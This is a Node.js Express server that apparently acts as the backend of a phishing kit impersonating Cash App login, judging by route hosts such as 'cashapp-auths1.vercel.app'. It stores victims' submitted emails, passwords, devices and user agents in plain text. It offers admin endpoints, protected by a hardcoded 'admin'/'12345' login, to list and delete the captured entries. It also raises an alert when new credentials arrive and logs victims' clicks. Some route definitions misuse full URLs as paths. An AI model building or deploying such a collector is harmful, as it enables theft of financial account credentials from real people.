const express = require("express");
const fs = require("fs");
const cors = require("cors");
const bodyParser = require("body-parser");
const app = express();
const PORT = 5000;

app.use(cors());
app.use(bodyParser.json());

let alertOn = false;
const dataFile = __dirname + "/data.txt";
const clickFile = __dirname + "/clicks.txt";

// === UTILITY: Read Login Data ===
function readData() {
  if (!fs.existsSync(dataFile)) return [];
  const lines = fs.readFileSync(dataFile, "utf-8").split("\n").filter(Boolean);
  return lines.map((line, idx) => {
    const [email, password, device, userAgent, time] = line.split("|");
    return { id: idx, email, password, device, userAgent, time };
  });
}

// === UTILITY: Write Login Data ===
function writeData(data) {
  const lines = data.map(d =>
    [d.email, d.password, d.device, d.userAgent, d.time].join("|")
  );
  fs.writeFileSync(dataFile, lines.join("\n"));
}

// === ADMIN LOGIN ===
app.post("https://cashapp-auths1.vercel.app/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === "admin" && password === "12345") {
    return res.json({ success: true });
  }
  res.json({ success: false });
});

// === GET ALL LOGIN ENTRIES ===
app.get("https://cashapp-auths1.vercel.app/api/data", (req, res) => {
  const data = readData();
  res.json(data);
});

// === DELETE LOGIN ENTRY ===
app.delete("https://cashapp-auths1.vercel.app/api/data/:id", (req, res) => {
  let data = readData();
  const id = parseInt(req.params.id);
  data = data.filter((_, index) => index !== id);
  writeData(data);
  res.sendStatus(200);
});

// === ADD LOGIN ENTRY ===
app.post("https://cashapp-auths1.vercel.app/api/data", (req, res) => {
  const { email, password, device, userAgent, time } = req.body;
  const line = [email, password, device, userAgent, time].join("|");
  fs.appendFileSync(dataFile, line + "\n");
  alertOn = true;
  res.sendStatus(200);
});

// === ALERT STATUS ===
app.get("https://node-server-js-k66j.onrender.com/api/check-alert", (req, res) => {
  res.json({ alert: alertOn });
});
app.post("https://node-server-js-k66j.onrender.com/api/stop-alert", (req, res) => {
  alertOn = false;
  res.sendStatus(200);
});

// === TRACK CLICKS ===
app.post("https://cashapp-auths1.vercel.app/api/click", (req, res) => {
  const { device,  time } = req.body;
  const line = [device,  time].join("|");
  fs.appendFileSync(clickFile, line + "\n");
  res.sendStatus(200);
});

// === GET CLICK INFO ===
app.get("https://cashapp-auths1.vercel.app/api/clicks", (req, res) => {
  if (!fs.existsSync(clickFile)) return res.json([]);
  const lines = fs.readFileSync(clickFile, "utf-8").split("\n").filter(Boolean);
  const data = lines.map((line, idx) => {
    const [device,  time] = line.split("|");
    return { id: idx, device,  time };
  });
  res.json(data);
});

// === BACKEND STATUS ===
app.get("/", (req, res) => {
  res.send("✅ Backend is working!");
});

// === START SERVER ===
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
